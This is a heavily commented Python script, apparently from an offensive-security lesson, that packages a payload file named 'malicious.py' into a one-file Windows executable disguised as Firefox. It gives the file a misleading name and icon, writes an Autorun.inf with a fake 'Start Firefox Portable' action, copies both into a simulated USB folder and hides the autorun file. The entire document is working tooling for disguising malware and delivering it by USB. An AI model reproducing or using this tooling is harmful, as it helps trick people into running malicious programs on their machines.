# Use the PyInstaller tool to turn a .py file into a .exe
import PyInstaller.__main__

# Tools to move/delete files
import shutil

# Tool to interact with the operating system (like folders, files, commands)
import os

# This is the name of the Python script we're turning into an .exe
filename = "malicious.py"

# This is the name we want the final .exe file to have (pretending it's safe)
exename = "benign.exe"

# This is the icon we want to give the .exe so it looks familiar (like Firefox)
icon = "firefox.ico"

# Get the folder we're currently in (called "present working directory")
pwd = os.getcwd()

# Make a new path that points to a folder named "usb" in our current location
usbdir = os.path.join(pwd, "usb")

# IF this file already exists...
# "if" is a way to say: only do this next part if something is true
if os.path.isfile(exename):
    # Delete the existing .exe so we can build a new one
    os.remove(exename)

# Just printing text so we know what's happening
print("Creating EXE")

# This turns the Python file into a Windows .exe using PyInstaller
PyInstaller.__main__.run([
    filename,              # the Python file to turn into an .exe
    "--onefile",           # make it just one file instead of a folder
    "--clean",             # remove any previous build files first
    "--log-level=ERROR",   # only show error messages (no spam)
    "--name=" + exename,   # name of the .exe file
    "--icon=" + icon,      # the icon to use
])

# Print text saying we're done making the .exe
print("EXE created")

# Set the path to where PyInstaller puts the final .exe (in a "dist" folder)
dist_exe = os.path.join(pwd, "dist", exename)

# IF the .exe file was created...
if os.path.exists(dist_exe):
    # Move it to the main folder so we can use it
    shutil.move(dist_exe, pwd)

# Delete leftover folders PyInstaller made (to keep things clean)
if os.path.exists("dist"):
    shutil.rmtree("dist")

if os.path.exists("build"):
    shutil.rmtree("build")

if os.path.exists("__pycache__"):
    shutil.rmtree("__pycache__")

# Delete the .spec file PyInstaller made (we don’t need it)
if os.path.exists(exename + ".spec"):
    os.remove(exename + ".spec")

# Print message that we're now making the Autorun file
print("Creating Autorun File")

# "with" is a way to open a file, do stuff with it, and automatically close it after
with open("Autorun.inf", "w") as o:
    # Write lines to tell Windows what to do if USB autorun works
    o.write("[Autorun]\n")  # tells Windows this is an autorun file
    o.write("Action=Start Firefox Portable\n")  # fake message for the user
    o.write(f"Icon={exename}\n")  # sets the icon for the USB

# Print message saying we're about to simulate the USB
print("Setting up USB")

# IF the usb folder doesn’t exist yet...
if not os.path.exists(usbdir):
    # Make the usb folder
    os.makedirs(usbdir)

# Move the .exe file and the Autorun file into the usb folder
shutil.move(exename, usbdir)
shutil.move("Autorun.inf", usbdir)

# Make a path to the Autorun file inside the usb folder
autorun_path = os.path.join(usbdir, "Autorun.inf")

# Print the command we're about to run (for visibility)
print("attrib +h " + autorun_path)

# Actually run the Windows command to hide the Autorun file
# "os.system" lets us run system commands like we typed them in the terminal
os.system("attrib +h " + autorun_path)
